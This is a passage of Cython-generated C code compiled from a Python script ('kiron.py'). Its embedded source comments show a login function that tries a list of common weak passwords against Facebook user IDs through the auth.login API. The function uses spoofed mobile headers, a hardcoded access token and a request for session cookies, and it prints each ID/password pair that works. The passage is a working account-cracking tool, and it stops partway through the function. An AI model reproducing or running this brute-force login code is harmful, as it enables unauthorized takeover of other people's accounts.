static PyObject *__pyx_pw_5kiron_17login(PyObject *__pyx_self, 
#if CYTHON_METH_FASTCALL
PyObject *const *__pyx_args, Py_ssize_t __pyx_nargs, PyObject *__pyx_kwds
#else
PyObject *__pyx_args, PyObject *__pyx_kwds
#endif
); /*proto*/
static PyMethodDef __pyx_mdef_5kiron_17login = {"login", (PyCFunction)(void*)(__Pyx_PyCFunction_FastCallWithKeywords)__pyx_pw_5kiron_17login, __Pyx_METH_FASTCALL|METH_KEYWORDS, 0};
static PyObject *__pyx_pw_5kiron_17login(PyObject *__pyx_self, 
#if CYTHON_METH_FASTCALL
PyObject *const *__pyx_args, Py_ssize_t __pyx_nargs, PyObject *__pyx_kwds
#else
PyObject *__pyx_args, PyObject *__pyx_kwds
#endif
) {
  PyObject *__pyx_v_uid = 0;
  #if !CYTHON_METH_FASTCALL
  CYTHON_UNUSED Py_ssize_t __pyx_nargs;
  #endif
  CYTHON_UNUSED PyObject *const *__pyx_kwvalues;
  PyObject* values[1] = {0};
  int __pyx_lineno = 0;
  const char *__pyx_filename = NULL;
  int __pyx_clineno = 0;
  PyObject *__pyx_r = 0;
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("login (wrapper)", 0);
  #if !CYTHON_METH_FASTCALL
  #if CYTHON_ASSUME_SAFE_MACROS
  __pyx_nargs = PyTuple_GET_SIZE(__pyx_args);
  #else
  __pyx_nargs = PyTuple_Size(__pyx_args); if (unlikely(__pyx_nargs < 0)) return NULL;
  #endif
  #endif
  __pyx_kwvalues = __Pyx_KwValues_FASTCALL(__pyx_args, __pyx_nargs);
  {
    PyObject **__pyx_pyargnames[] = {&__pyx_n_s_uid,0};
    if (__pyx_kwds) {
      Py_ssize_t kw_args;
      switch (__pyx_nargs) {
        case  1: values[0] = __Pyx_Arg_FASTCALL(__pyx_args, 0);
        CYTHON_FALLTHROUGH;
        case  0: break;
        default: goto __pyx_L5_argtuple_error;
      }
      kw_args = __Pyx_NumKwargs_FASTCALL(__pyx_kwds);
      switch (__pyx_nargs) {
        case  0:
        if (likely((values[0] = __Pyx_GetKwValue_FASTCALL(__pyx_kwds, __pyx_kwvalues, __pyx_n_s_uid)) != 0)) {
          (void)__Pyx_Arg_NewRef_FASTCALL(values[0]);
          kw_args--;
        }
        else if (unlikely(PyErr_Occurred())) __PYX_ERR(0, 220, __pyx_L3_error)
        else goto __pyx_L5_argtuple_error;
      }
      if (unlikely(kw_args > 0)) {
        const Py_ssize_t kwd_pos_args = __pyx_nargs;
        if (unlikely(__Pyx_ParseOptionalKeywords(__pyx_kwds, __pyx_kwvalues, __pyx_pyargnames, 0, values + 0, kwd_pos_args, "login") < 0)) __PYX_ERR(0, 220, __pyx_L3_error)
      }
    } else if (unlikely(__pyx_nargs != 1)) {
      goto __pyx_L5_argtuple_error;
    } else {
      values[0] = __Pyx_Arg_FASTCALL(__pyx_args, 0);
    }
    __pyx_v_uid = values[0];
  }
  goto __pyx_L6_skip;
  __pyx_L5_argtuple_error:;
  __Pyx_RaiseArgtupleInvalid("login", 1, 1, 1, __pyx_nargs); __PYX_ERR(0, 220, __pyx_L3_error)
  __pyx_L6_skip:;
  goto __pyx_L4_argument_unpacking_done;
  __pyx_L3_error:;
  {
    Py_ssize_t __pyx_temp;
    for (__pyx_temp=0; __pyx_temp < (Py_ssize_t)(sizeof(values)/sizeof(values[0])); ++__pyx_temp) {
      __Pyx_Arg_XDECREF_FASTCALL(values[__pyx_temp]);
    }
  }
  __Pyx_AddTraceback("kiron.login", __pyx_clineno, __pyx_lineno, __pyx_filename);
  __Pyx_RefNannyFinishContext();
  return NULL;
  __pyx_L4_argument_unpacking_done:;
  __pyx_r = __pyx_pf_5kiron_16login(__pyx_self, __pyx_v_uid);

  /* function exit code */
  {
    Py_ssize_t __pyx_temp;
    for (__pyx_temp=0; __pyx_temp < (Py_ssize_t)(sizeof(values)/sizeof(values[0])); ++__pyx_temp) {
      __Pyx_Arg_XDECREF_FASTCALL(values[__pyx_temp]);
    }
  }
  __Pyx_RefNannyFinishContext();
  return __pyx_r;
}

static PyObject *__pyx_pf_5kiron_16login(CYTHON_UNUSED PyObject *__pyx_self, PyObject *__pyx_v_uid) {
  PyObject *__pyx_v_Session = NULL;
  PyObject *__pyx_v_pw = NULL;
  PyObject *__pyx_v_headers = NULL;
  PyObject *__pyx_v_rp = NULL;
  PyObject *__pyx_r = NULL;
  __Pyx_RefNannyDeclarations
  PyObject *__pyx_t_1 = NULL;
  PyObject *__pyx_t_2 = NULL;
  PyObject *__pyx_t_3 = NULL;
  int __pyx_t_4;
  PyObject *__pyx_t_5 = NULL;
  PyObject *__pyx_t_6 = NULL;
  PyObject *__pyx_t_7 = NULL;
  Py_ssize_t __pyx_t_8;
  Py_UCS4 __pyx_t_9;
  PyObject *__pyx_t_10 = NULL;
  PyObject *__pyx_t_11 = NULL;
  Py_ssize_t __pyx_t_12;
  PyObject *__pyx_t_13 = NULL;
  int __pyx_t_14;
  int __pyx_t_15;
  int __pyx_lineno = 0;
  const char *__pyx_filename = NULL;
  int __pyx_clineno = 0;
  __Pyx_RefNannySetupContext("login", 1);

  /* "kiron.py":222
 * def login(uid):
 *     global oks,loop
 *     Session=requests.session()             # <<<<<<<<<<<<<<
 *     try:
 *         sys.stdout.write(f'\r\x1b[38;5;244m[\x1b[38;5;46m{date}\x1b[38;5;244m]\x1b[38;5;244m\x1b[38;5;46m\x1b[38;5;244m[\x1b[38;5;46m{loop}\x1b[38;5;244m]\x1b[38;5;244m-\x1b[38;5;46m\x1b[38;5;244m[\x1b[38;5;46m{len(oks)}\x1b[38;5;244m/\x1b[38;5;46m{len(cps)}\x1b[38;5;244m]')
 */
  __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_n_s_requests); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 222, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __pyx_t_3 = __Pyx_PyObject_GetAttrStr(__pyx_t_2, __pyx_n_s_session); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 222, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __pyx_t_2 = NULL;
  __pyx_t_4 = 0;
  #if CYTHON_UNPACK_METHODS
  if (unlikely(PyMethod_Check(__pyx_t_3))) {
    __pyx_t_2 = PyMethod_GET_SELF(__pyx_t_3);
    if (likely(__pyx_t_2)) {
      PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_3);
      __Pyx_INCREF(__pyx_t_2);
      __Pyx_INCREF(function);
      __Pyx_DECREF_SET(__pyx_t_3, function);
      __pyx_t_4 = 1;
    }
  }
  #endif
  {
    PyObject *__pyx_callargs[2] = {__pyx_t_2, NULL};
    __pyx_t_1 = __Pyx_PyObject_FastCall(__pyx_t_3, __pyx_callargs+1-__pyx_t_4, 0+__pyx_t_4);
    __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
    if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 222, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_1);
    __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  }
  __pyx_v_Session = __pyx_t_1;
  __pyx_t_1 = 0;

  /* "kiron.py":223
 *     global oks,loop
 *     Session=requests.session()
 *     try:             # <<<<<<<<<<<<<<
 *         sys.stdout.write(f'\r\x1b[38;5;244m[\x1b[38;5;46m{date}\x1b[38;5;244m]\x1b[38;5;244m\x1b[38;5;46m\x1b[38;5;244m[\x1b[38;5;46m{loop}\x1b[38;5;244m]\x1b[38;5;244m-\x1b[38;5;46m\x1b[38;5;244m[\x1b[38;5;46m{len(oks)}\x1b[38;5;244m/\x1b[38;5;46m{len(cps)}\x1b[38;5;244m]')
 *         sys.stdout.flush()
 */
  {
    __Pyx_PyThreadState_declare
    __Pyx_PyThreadState_assign
    __Pyx_ExceptionSave(&__pyx_t_5, &__pyx_t_6, &__pyx_t_7);
    __Pyx_XGOTREF(__pyx_t_5);
    __Pyx_XGOTREF(__pyx_t_6);
    __Pyx_XGOTREF(__pyx_t_7);
    /*try:*/ {

      /* "kiron.py":224
 *     Session=requests.session()
 *     try:
 *         sys.stdout.write(f'\r\x1b[38;5;244m[\x1b[38;5;46m{date}\x1b[38;5;244m]\x1b[38;5;244m\x1b[38;5;46m\x1b[38;5;244m[\x1b[38;5;46m{loop}\x1b[38;5;244m]\x1b[38;5;244m-\x1b[38;5;46m\x1b[38;5;244m[\x1b[38;5;46m{len(oks)}\x1b[38;5;244m/\x1b[38;5;46m{len(cps)}\x1b[38;5;244m]')             # <<<<<<<<<<<<<<
 *         sys.stdout.flush()
 *         for pw in ["123456","1234567","12345678","123456789","123123","112233","1234567890"]:
 */
      __Pyx_GetModuleGlobalName(__pyx_t_3, __pyx_n_s_sys); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 224, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_3);
      __pyx_t_2 = __Pyx_PyObject_GetAttrStr(__pyx_t_3, __pyx_n_s_stdout); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 224, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_2);
      __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
      __pyx_t_3 = __Pyx_PyObject_GetAttrStr(__pyx_t_2, __pyx_n_s_write); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 224, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_3);
      __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
      __pyx_t_2 = PyTuple_New(9); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 224, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_2);
      __pyx_t_8 = 0;
      __pyx_t_9 = 127;
      __Pyx_INCREF(__pyx_kp_u_38_5_244m_38_5_46m);
      __pyx_t_8 += 23;
      __Pyx_GIVEREF(__pyx_kp_u_38_5_244m_38_5_46m);
      PyTuple_SET_ITEM(__pyx_t_2, 0, __pyx_kp_u_38_5_244m_38_5_46m);
      __Pyx_GetModuleGlobalName(__pyx_t_10, __pyx_n_s_date); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 224, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_10);
      __pyx_t_11 = __Pyx_PyObject_FormatSimple(__pyx_t_10, __pyx_empty_unicode); if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 224, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_11);
      __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
      __pyx_t_9 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_11) > __pyx_t_9) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_11) : __pyx_t_9;
      __pyx_t_8 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_11);
      __Pyx_GIVEREF(__pyx_t_11);
      PyTuple_SET_ITEM(__pyx_t_2, 1, __pyx_t_11);
      __pyx_t_11 = 0;
      __Pyx_INCREF(__pyx_kp_u_38_5_244m_38_5_244m_38_5_46m_38);
      __pyx_t_9 = (65535 > __pyx_t_9) ? 65535 : __pyx_t_9;
      __pyx_t_8 += 56;
      __Pyx_GIVEREF(__pyx_kp_u_38_5_244m_38_5_244m_38_5_46m_38);
      PyTuple_SET_ITEM(__pyx_t_2, 2, __pyx_kp_u_38_5_244m_38_5_244m_38_5_46m_38);
      __Pyx_GetModuleGlobalName(__pyx_t_11, __pyx_n_s_loop); if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 224, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_11);
      __pyx_t_10 = __Pyx_PyObject_FormatSimple(__pyx_t_11, __pyx_empty_unicode); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 224, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_10);
      __Pyx_DECREF(__pyx_t_11); __pyx_t_11 = 0;
      __pyx_t_9 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_10) > __pyx_t_9) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_10) : __pyx_t_9;
      __pyx_t_8 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_10);
      __Pyx_GIVEREF(__pyx_t_10);
      PyTuple_SET_ITEM(__pyx_t_2, 3, __pyx_t_10);
      __pyx_t_10 = 0;
      __Pyx_INCREF(__pyx_kp_u_38_5_244m_38_5_244m_38_5_46m_38_2);
      __pyx_t_8 += 56;
      __Pyx_GIVEREF(__pyx_kp_u_38_5_244m_38_5_244m_38_5_46m_38_2);
      PyTuple_SET_ITEM(__pyx_t_2, 4, __pyx_kp_u_38_5_244m_38_5_244m_38_5_46m_38_2);
      __Pyx_GetModuleGlobalName(__pyx_t_10, __pyx_n_s_oks); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 224, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_10);
      __pyx_t_12 = PyObject_Length(__pyx_t_10); if (unlikely(__pyx_t_12 == ((Py_ssize_t)-1))) __PYX_ERR(0, 224, __pyx_L3_error)
      __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
      __pyx_t_10 = __Pyx_PyUnicode_From_Py_ssize_t(__pyx_t_12, 0, ' ', 'd'); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 224, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_10);
      __pyx_t_8 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_10);
      __Pyx_GIVEREF(__pyx_t_10);
      PyTuple_SET_ITEM(__pyx_t_2, 5, __pyx_t_10);
      __pyx_t_10 = 0;
      __Pyx_INCREF(__pyx_kp_u_38_5_244m_38_5_46m_2);
      __pyx_t_8 += 22;
      __Pyx_GIVEREF(__pyx_kp_u_38_5_244m_38_5_46m_2);
      PyTuple_SET_ITEM(__pyx_t_2, 6, __pyx_kp_u_38_5_244m_38_5_46m_2);
      __Pyx_GetModuleGlobalName(__pyx_t_10, __pyx_n_s_cps); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 224, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_10);
      __pyx_t_12 = PyObject_Length(__pyx_t_10); if (unlikely(__pyx_t_12 == ((Py_ssize_t)-1))) __PYX_ERR(0, 224, __pyx_L3_error)
      __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
      __pyx_t_10 = __Pyx_PyUnicode_From_Py_ssize_t(__pyx_t_12, 0, ' ', 'd'); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 224, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_10);
      __pyx_t_8 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_10);
      __Pyx_GIVEREF(__pyx_t_10);
      PyTuple_SET_ITEM(__pyx_t_2, 7, __pyx_t_10);
      __pyx_t_10 = 0;
      __Pyx_INCREF(__pyx_kp_u_38_5_244m);
      __pyx_t_8 += 12;
      __Pyx_GIVEREF(__pyx_kp_u_38_5_244m);
      PyTuple_SET_ITEM(__pyx_t_2, 8, __pyx_kp_u_38_5_244m);
      __pyx_t_10 = __Pyx_PyUnicode_Join(__pyx_t_2, 9, __pyx_t_8, __pyx_t_9); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 224, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_10);
      __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
      __pyx_t_2 = NULL;
      __pyx_t_4 = 0;
      #if CYTHON_UNPACK_METHODS
      if (likely(PyMethod_Check(__pyx_t_3))) {
        __pyx_t_2 = PyMethod_GET_SELF(__pyx_t_3);
        if (likely(__pyx_t_2)) {
          PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_3);
          __Pyx_INCREF(__pyx_t_2);
          __Pyx_INCREF(function);
          __Pyx_DECREF_SET(__pyx_t_3, function);
          __pyx_t_4 = 1;
        }
      }
      #endif
      {
        PyObject *__pyx_callargs[2] = {__pyx_t_2, __pyx_t_10};
        __pyx_t_1 = __Pyx_PyObject_FastCall(__pyx_t_3, __pyx_callargs+1-__pyx_t_4, 1+__pyx_t_4);
        __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
        __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
        if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 224, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_1);
        __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
      }
      __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

      /* "kiron.py":225
 *     try:
 *         sys.stdout.write(f'\r\x1b[38;5;244m[\x1b[38;5;46m{date}\x1b[38;5;244m]\x1b[38;5;244m\x1b[38;5;46m\x1b[38;5;244m[\x1b[38;5;46m{loop}\x1b[38;5;244m]\x1b[38;5;244m-\x1b[38;5;46m\x1b[38;5;244m[\x1b[38;5;46m{len(oks)}\x1b[38;5;244m/\x1b[38;5;46m{len(cps)}\x1b[38;5;244m]')
 *         sys.stdout.flush()             # <<<<<<<<<<<<<<
 *         for pw in ["123456","1234567","12345678","123456789","123123","112233","1234567890"]:
 *             headers = {
 */
      __Pyx_GetModuleGlobalName(__pyx_t_3, __pyx_n_s_sys); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 225, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_3);
      __pyx_t_10 = __Pyx_PyObject_GetAttrStr(__pyx_t_3, __pyx_n_s_stdout); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 225, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_10);
      __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
      __pyx_t_3 = __Pyx_PyObject_GetAttrStr(__pyx_t_10, __pyx_n_s_flush); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 225, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_3);
      __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
      __pyx_t_10 = NULL;
      __pyx_t_4 = 0;
      #if CYTHON_UNPACK_METHODS
      if (likely(PyMethod_Check(__pyx_t_3))) {
        __pyx_t_10 = PyMethod_GET_SELF(__pyx_t_3);
        if (likely(__pyx_t_10)) {
          PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_3);
          __Pyx_INCREF(__pyx_t_10);
          __Pyx_INCREF(function);
          __Pyx_DECREF_SET(__pyx_t_3, function);
          __pyx_t_4 = 1;
        }
      }
      #endif
      {
        PyObject *__pyx_callargs[2] = {__pyx_t_10, NULL};
        __pyx_t_1 = __Pyx_PyObject_FastCall(__pyx_t_3, __pyx_callargs+1-__pyx_t_4, 0+__pyx_t_4);
        __Pyx_XDECREF(__pyx_t_10); __pyx_t_10 = 0;
        if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 225, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_1);
        __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
      }
      __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

      /* "kiron.py":226
 *         sys.stdout.write(f'\r\x1b[38;5;244m[\x1b[38;5;46m{date}\x1b[38;5;244m]\x1b[38;5;244m\x1b[38;5;46m\x1b[38;5;244m[\x1b[38;5;46m{loop}\x1b[38;5;244m]\x1b[38;5;244m-\x1b[38;5;46m\x1b[38;5;244m[\x1b[38;5;46m{len(oks)}\x1b[38;5;244m/\x1b[38;5;46m{len(cps)}\x1b[38;5;244m]')
 *         sys.stdout.flush()
 *         for pw in ["123456","1234567","12345678","123456789","123123","112233","1234567890"]:             # <<<<<<<<<<<<<<
 *             headers = {
 *             "x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)),
 */
      __pyx_t_1 = __pyx_tuple__28; __Pyx_INCREF(__pyx_t_1);
      __pyx_t_8 = 0;
      for (;;) {
        if (__pyx_t_8 >= 7) break;
        #if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS
        __pyx_t_3 = PyTuple_GET_ITEM(__pyx_t_1, __pyx_t_8); __Pyx_INCREF(__pyx_t_3); __pyx_t_8++; if (unlikely((0 < 0))) __PYX_ERR(0, 226, __pyx_L3_error)
        #else
        __pyx_t_3 = __Pyx_PySequence_ITEM(__pyx_t_1, __pyx_t_8); __pyx_t_8++; if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 226, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_3);
        #endif
        __Pyx_XDECREF_SET(__pyx_v_pw, __pyx_t_3);
        __pyx_t_3 = 0;

        /* "kiron.py":228
 *         for pw in ["123456","1234567","12345678","123456789","123123","112233","1234567890"]:
 *             headers = {
 *             "x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)),             # <<<<<<<<<<<<<<
 *             "x-fb-sim-hni": str(random.randint(20000, 40000)),
 *             "x-fb-net-hni": str(random.randint(20000, 40000)),
 */
        __pyx_t_3 = __Pyx_PyDict_NewPresized(8); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 228, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_3);
        __Pyx_GetModuleGlobalName(__pyx_t_10, __pyx_n_s_random); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 228, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_10);
        __pyx_t_2 = __Pyx_PyObject_GetAttrStr(__pyx_t_10, __pyx_n_s_randint); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 228, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_2);
        __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
        __pyx_t_10 = __Pyx_PyObject_Call(__pyx_t_2, __pyx_tuple__29, NULL); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 228, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_10);
        __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
        __pyx_t_2 = __Pyx_PyObject_Str(__pyx_t_10); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 228, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_2);
        __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
        if (PyDict_SetItem(__pyx_t_3, __pyx_kp_s_x_fb_connection_bandwidth, __pyx_t_2) < 0) __PYX_ERR(0, 228, __pyx_L3_error)
        __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;

        /* "kiron.py":229
 *             headers = {
 *             "x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)),
 *             "x-fb-sim-hni": str(random.randint(20000, 40000)),             # <<<<<<<<<<<<<<
 *             "x-fb-net-hni": str(random.randint(20000, 40000)),
 *             "x-fb-connection-quality": "EXCELLENT",
 */
        __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_n_s_random); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 229, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_2);
        __pyx_t_10 = __Pyx_PyObject_GetAttrStr(__pyx_t_2, __pyx_n_s_randint); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 229, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_10);
        __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
        __pyx_t_2 = __Pyx_PyObject_Call(__pyx_t_10, __pyx_tuple__30, NULL); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 229, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_2);
        __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
        __pyx_t_10 = __Pyx_PyObject_Str(__pyx_t_2); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 229, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_10);
        __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
        if (PyDict_SetItem(__pyx_t_3, __pyx_kp_s_x_fb_sim_hni, __pyx_t_10) < 0) __PYX_ERR(0, 228, __pyx_L3_error)
        __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;

        /* "kiron.py":230
 *             "x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)),
 *             "x-fb-sim-hni": str(random.randint(20000, 40000)),
 *             "x-fb-net-hni": str(random.randint(20000, 40000)),             # <<<<<<<<<<<<<<
 *             "x-fb-connection-quality": "EXCELLENT",
 *             "x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA",
 */
        __Pyx_GetModuleGlobalName(__pyx_t_10, __pyx_n_s_random); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 230, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_10);
        __pyx_t_2 = __Pyx_PyObject_GetAttrStr(__pyx_t_10, __pyx_n_s_randint); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 230, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_2);
        __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
        __pyx_t_10 = __Pyx_PyObject_Call(__pyx_t_2, __pyx_tuple__30, NULL); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 230, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_10);
        __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
        __pyx_t_2 = __Pyx_PyObject_Str(__pyx_t_10); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 230, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_2);
        __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
        if (PyDict_SetItem(__pyx_t_3, __pyx_kp_s_x_fb_net_hni, __pyx_t_2) < 0) __PYX_ERR(0, 228, __pyx_L3_error)
        __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
        if (PyDict_SetItem(__pyx_t_3, __pyx_kp_s_x_fb_connection_quality, __pyx_n_s_EXCELLENT) < 0) __PYX_ERR(0, 228, __pyx_L3_error)
        if (PyDict_SetItem(__pyx_t_3, __pyx_kp_s_x_fb_connection_type, __pyx_kp_s_cell_CTRadioAccessTechnologyHSDP) < 0) __PYX_ERR(0, 228, __pyx_L3_error)

        /* "kiron.py":233
 *             "x-fb-connection-quality": "EXCELLENT",
 *             "x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA",
 *             "user-agent": windows(),             # <<<<<<<<<<<<<<
 *             "content-type": "application/x-www-form-urlencoded",
 *             "x-fb-http-engine": "Liger"}
 */
        __Pyx_GetModuleGlobalName(__pyx_t_10, __pyx_n_s_windows); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 233, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_10);
        __pyx_t_11 = NULL;
        __pyx_t_4 = 0;
        #if CYTHON_UNPACK_METHODS
        if (unlikely(PyMethod_Check(__pyx_t_10))) {
          __pyx_t_11 = PyMethod_GET_SELF(__pyx_t_10);
          if (likely(__pyx_t_11)) {
            PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_10);
            __Pyx_INCREF(__pyx_t_11);
            __Pyx_INCREF(function);
            __Pyx_DECREF_SET(__pyx_t_10, function);
            __pyx_t_4 = 1;
          }
        }
        #endif
        {
          PyObject *__pyx_callargs[2] = {__pyx_t_11, NULL};
          __pyx_t_2 = __Pyx_PyObject_FastCall(__pyx_t_10, __pyx_callargs+1-__pyx_t_4, 0+__pyx_t_4);
          __Pyx_XDECREF(__pyx_t_11); __pyx_t_11 = 0;
          if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 233, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_2);
          __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
        }
        if (PyDict_SetItem(__pyx_t_3, __pyx_kp_s_user_agent, __pyx_t_2) < 0) __PYX_ERR(0, 228, __pyx_L3_error)
        __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
        if (PyDict_SetItem(__pyx_t_3, __pyx_kp_s_content_type, __pyx_kp_s_application_x_www_form_urlencode) < 0) __PYX_ERR(0, 228, __pyx_L3_error)
        if (PyDict_SetItem(__pyx_t_3, __pyx_kp_s_x_fb_http_engine, __pyx_n_s_Liger) < 0) __PYX_ERR(0, 228, __pyx_L3_error)
        __Pyx_XDECREF_SET(__pyx_v_headers, ((PyObject*)__pyx_t_3));
        __pyx_t_3 = 0;

        /* "kiron.py":236
 *             "content-type": "application/x-www-form-urlencoded",
 *             "x-fb-http-engine": "Liger"}
 *             rp=Session.get("https://api.facebook.com/method/auth.login?format=json&email="+str(uid)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20tly_logged_in_userid=0&method=GET&locale=en_GB&client_country_code=GB&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers).json()             # <<<<<<<<<<<<<<
 *             if "session_key" in rp:
 *                 print(f"\r\x1b[38;5;244m[\x1b[38;5;244mAYYUB-OK\x1b[38;5;244m]\x1b[38;5;244m {uid} \x1b[38;5;244m\x1b[38;5;46m {pw}")
 */
        __pyx_t_2 = __Pyx_PyObject_GetAttrStr(__pyx_v_Session, __pyx_n_s_get); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 236, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_2);
        __pyx_t_10 = __Pyx_PyObject_Str(__pyx_v_uid); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 236, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_10);
